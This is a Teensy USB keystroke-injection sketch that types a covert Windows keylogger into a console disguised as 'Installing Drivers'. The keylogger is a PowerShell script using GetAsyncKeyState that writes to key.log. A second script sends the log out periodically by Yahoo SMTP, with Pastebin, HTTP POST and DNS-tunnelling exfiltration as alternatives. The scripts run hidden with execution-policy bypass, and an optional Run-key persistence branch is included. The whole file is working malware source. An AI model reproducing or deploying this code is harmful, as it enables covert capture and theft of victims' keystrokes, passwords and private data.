#define TEENSY2
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){
  
 delay(3000);
  wait_for_drivers(2000);
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=20 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  if ("y" == "n")
    {
    Keyboard.println("echo New-ItemProperty -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Update -PropertyType String -Value \"$env:TEMP\\kl.vbs\" -force > %temp%\\kl.ps1");
    Keyboard.println("echo New-ItemProperty -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Update64 -PropertyType String -Value \"$env:TEMP\\kp.vbs\" -force >> %temp%\\kp.ps1");
    Keyboard.println("echo $s = @' >> %temp%\\kl.ps1");
    }
  else
    {
      Keyboard.println("echo $s = @' > %temp%\\kl.ps1");
    }
  Keyboard.println("echo [DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] >> %temp%\\kl.ps1");
  Keyboard.println("echo public static extern short GetAsyncKeyState(int virtualKeyCode); >> %temp%\\kl.ps1");
  Keyboard.println("echo '@ >> %temp%\\kl.ps1");
  Keyboard.println("echo $gk = Add-Type -memberDefinition $s -name \"Win32GetState\" -namespace Win32Functions -passThru >> %temp%\\kl.ps1");
  Keyboard.println("echo $chk = 0 >> %temp%\\kl.ps1");
  Keyboard.println("echo while ($true) { >> %temp%\\kl.ps1");
  Keyboard.println("echo Sleep -Milliseconds 40 >> %temp%\\kl.ps1");
  Keyboard.println("echo $l = \"\" >> %temp%\\kl.ps1");
  Keyboard.println("echo $r=\"\" >> %temp%\\kl.ps1");
  Keyboard.println("echo $ss=\"\" >> %temp%\\kl.ps1");
  Keyboard.println("echo $cs=\"\" >> %temp%\\kl.ps1");
  Keyboard.println("echo for ($ch=1;$ch -le 254;$ch++) >> %temp%\\kl.ps1");
  Keyboard.println("echo { >> %temp%\\kl.ps1");
  Keyboard.println("echo $vk = $ch >> %temp%\\kl.ps1");
  Keyboard.println("echo $l = $gk::GetAsyncKeyState($vk) >> %temp%\\kl.ps1");
  Keyboard.println("echo if ($l -eq -32767) >> %temp%\\kl.ps1");
  Keyboard.println("echo { >> %temp%\\kl.ps1");
  Keyboard.println("echo if(($vk -ge 48) -and ($vk -le 57)) >> %temp%\\kl.ps1");
  Keyboard.println("echo { >> %temp%\\kl.ps1");
  Keyboard.println("echo $lss = $gk::GetAsyncKeyState(160) >> %temp%\\kl.ps1");
  Keyboard.println("echo $rss = $gk::GetAsyncKeyState(161) >> %temp%\\kl.ps1");
  Keyboard.println("echo if(($lss -eq -32768) -or ($rss -eq -32768)) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = \"S-\" + $vk } >> %temp%\\kl.ps1");
  Keyboard.println("echo else { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = $vk }} >> %temp%\\kl.ps1");
  Keyboard.println("echo elseif(($vk -ge 64) -and ($vk -le 90)) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $lss = $gk::GetAsyncKeyState(160) >> %temp%\\kl.ps1");
  Keyboard.println("echo $rss = $gk::GetAsyncKeyState(161) >> %temp%\\kl.ps1");
  Keyboard.println("echo $cs = [console]::CapsLock >> %temp%\\kl.ps1");
  Keyboard.println("echo if(!(($lss -eq -32768) -or ($rss -eq -32768)) -xor $cs) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = \"S-\" + $vk } >> %temp%\\kl.ps1");
  Keyboard.println("echo else {>> %temp%\\kl.ps1");
  Keyboard.println("echo $r = $vk }} >> %temp%\\kl.ps1");
  Keyboard.println("echo elseif((($vk -ge 186) -and ($vk -le 192)) -or (($vk -ge 219) -and ($vk -le 222))) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $lss = $gk::GetAsyncKeyState(160) >> %temp%\\kl.ps1");
  Keyboard.println("echo $rss = $gk::GetAsyncKeyState(161) >> %temp%\\kl.ps1");
  Keyboard.println("echo if(($lss -eq -32768) -or ($rss -eq -32768)) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = \"S-\" + $vk } >> %temp%\\kl.ps1");
  Keyboard.println("echo else { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = $vk }}>> %temp%\\kl.ps1");
  Keyboard.println("echo else { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = $vk } >> %temp%\\kl.ps1");
  Keyboard.println("echo $now = Get-Date; >> %temp%\\kl.ps1");
  Keyboard.println("echo $ll = \"$r \" >> %temp%\\kl.ps1");
  Keyboard.println("echo $fln = \"%temp%\\key.log\" >> %temp%\\kl.ps1");
  Keyboard.println("echo Out-File -FilePath $fln -Append -InputObject \"$ll\" }} >> %temp%\\kl.ps1");
  Keyboard.println("echo $chk++ >> %temp%\\kl.ps1");
  Keyboard.println("echo if($chk -eq 6000) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\kl.ps1");
  Keyboard.println("echo $fc = $wc.DownloadString(\"www.h14z.com\") >> %temp%\\kl.ps1");
  Keyboard.println("echo if($fc -eq \"www.h14z.com\") { break } >> %temp%\\kl.ps1");
  Keyboard.println("echo }} >> %temp%\\kl.ps1");  
  delay(2000);

  Keyboard.println("echo $ErrorActionPreference = \"SilentlyContinue\" > %temp%\\kp.ps1");
  Keyboard.println("echo $chk = 0 >> %temp%\\kp.ps1");
  Keyboard.println("echo $read = 0  >> %temp%\\kp.ps1");
  Keyboard.println("echo while($true) { >> %temp%\\kp.ps1");
  Keyboard.println("echo sleep 900 >> %temp%\\kp.ps1");
  Keyboard.println("echo $now = Get-Date; >> %temp%\\kp.ps1");  
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Keylog:  \" +  $now.ToUniversalTime().ToString(\"dd/MM/yyyy HH:mm:ss:fff\")>> %temp%\\kp.ps1");
  Keyboard.println("echo $user = \"xxxxxxxxx\" >> %temp%\\kp.ps1");
  Keyboard.println("echo $pass = \"xxxxxxxxxx\" >> %temp%\\kp.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\kp.ps1");
  Keyboard.println("echo $pv=gc %temp%\\key.log >> %temp%\\kp.ps1"); 
  Keyboard.println("echo $read++ >> %temp%\\kp.ps1");
  Keyboard.println("echo if ($read -eq 30) { >> %temp%\\kp.ps1");
  Keyboard.println("echo Out-File -FilePath $env:temp\\key.log -Force -InputObject \" \" >> %temp%\\kp.ps1");
  Keyboard.println("echo $read = 0 } >> %temp%\\kp.ps1");

  String fn = "kp";
  String fp;
   if ("gmail" == "pastebin")
  {
    pastebin(fn);
  }
  else if ("gmail" == "gmail")
  {
    if (fp != "")
    {
        gmail(fn,fp);
    }
    else
    {
        gmail(fn,"no");
    }
  }
  else if ("gmail" == "post")
  {
    hpost(fn);
  }
  else if ("gmail" == "dns")
  {
    dns(fn);
  }

  
  Keyboard.println("echo $chk++ >> %temp%\\kp.ps1");
  Keyboard.println("echo if($chk -eq 100) { >> %temp%\\kp.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\kp.ps1");
  Keyboard.println("echo $fc = $wc.DownloadString(\"www.h14z.com\") >> %temp%\\kp.ps1");
  Keyboard.println("echo if($fc -eq \"www.h14z.com\") { break } >> %temp%\\kp.ps1");
  Keyboard.println("echo $chk=0 >> %temp%\\kp.ps1");
  Keyboard.println("echo }} >> %temp%\\kp.ps1");
  delay(2000);

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\kp.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\kp.ps1\"),0,true >> %temp%\\kp.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\kp.vbs");
  delay(3000);

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\kl.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\kl.ps1\"),0,true >> %temp%\\kl.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\kl.vbs");
  delay(3000);

  Keyboard.println("exit");

}

void loop(){
}

void wait_for_drivers(int sleep)
{
bool CapsLockTrap = is_caps_on();
while(CapsLockTrap == is_caps_on())
{
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.send_now();
delay(100);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=20 LINES=1 && title Installing Drivers\"");
delay(100);
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.send_now();
Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
Keyboard.send_now();
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(7000);
send_left_enter();
delay(4000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_R);
Keyboard.send_now();

delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

Keyboard.print(SomeCommand);
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();

delay(3000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_off(void)
{
if (is_caps_on())
{
delay(500);
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
delay(700);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(700);
}
}

void create_click_capslock_win()
{
Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");
delay(400);
Keyboard.println("wscript %temp%\\capslock.vbs");
delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
unsigned int i = 0;
do
{
delay(millisecs);
if (is_caps_on())
{
make_sure_capslock_is_off();
delay(700);
return true;
}
i++;
}
while (!is_caps_on() && (i<reps));
return false;
}

void minimise_windows(void)
{
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_M);
Keyboard.send_now();
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(300);
}

void reset_windows_desktop(int sleep)
{
delay(1000);
minimise_windows();
delay(sleep);
minimise_windows();
delay(sleep);
minimise_windows();
delay(200);
}

void send_left_enter(){
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }


void post(String filename)
{
    Keyboard.print("echo function pht($url,$pars) { >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht = New-Object -ComObject Msxml2.XMLHTTP >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.open(\"POST\", $url, $false) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\") >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.setRequestHeader(\"Content-length\", $pars.length); >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.setRequestHeader(\"Connection\", \"close\") >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.send($pars) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $script:sk=$ht.responseText }>> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

void compress_encode(String filename)
{
 Keyboard.print("echo $ms = New-Object IO.MemoryStream >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $ac = [IO.Compression.CompressionMode]::Compress >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $cs = New-Object IO.Compression.DeflateStream ($ms,$ac) >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII) >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $pv ^| ForEach-Object {$sw.WriteLine($_)} >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $sw.Close() >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $code = [Convert]::ToBase64String($ms.ToArray()) >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
}

void pastebin(String filename)
{
    post(filename);
    Keyboard.print("echo pht \"https://pastebin.com/api/api_login.php\" \"api_dev_key=$dev&api_user_name=$user&api_user_password=$pass\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo pht \"https://pastebin.com/api/api_post.php\" \"api_user_key=$sk&api_option=paste&api_dev_key=$dev&api_paste_name=$pn&api_paste_code=$pv&api_paste_private=2\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

void gmail(String filename, String filepath)
{
    Keyboard.print("echo $srv = \"smtp.mail.yahoo.com\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg = new-object Net.Mail.MailMessage >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $st = new-object Net.Mail.SmtpClient($srv) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $st.EnableSsl = $True >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $st.Credentials = New-Object System.Net.NetworkCredential(\"$user\", \"$pass\"); >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg.From = \"$user@yahoo.com\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg.To.Add(\"$user@yahoo.com\") >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg.Subject = $pn >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg.Body = $pv >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    if (filepath != "no"){

        Keyboard.print("echo $att = new-object Net.Mail.Attachment(\"");
        Keyboard.print (filepath);
        Keyboard.print ("\") >> %temp%\\");
        Keyboard.print(filename);
        Keyboard.println(".ps1");
        Keyboard.print("echo $msg.Attachments.Add($att) >> %temp%\\");
        Keyboard.print(filename);
        Keyboard.println(".ps1");
    }
    Keyboard.print("echo $st.Send($msg) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

void hpost (String filename)
{
    compress_encode(filename);
    post(filename);
    Keyboard.print("echo pht $user $code >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

void dns (String filename)
{
    compress_encode(filename);
    Keyboard.print("echo $lstr = 0 >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $qrs = [int]($code.Length/63) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo while ($qrs -ne 0){ >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $qs = $code.Substring($lstr,63) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo Invoke-Expression \"nslookup -querytype=txt $qs.$user $pass\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $lstr += 63 >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $qrs -= 1 } >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $mod = $code.Length%63 >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $qr = $code.Substring($code.Length - $mod, $mod) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo Invoke-Expression \"nslookup -querytype=txt $qr.$user $pass\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}
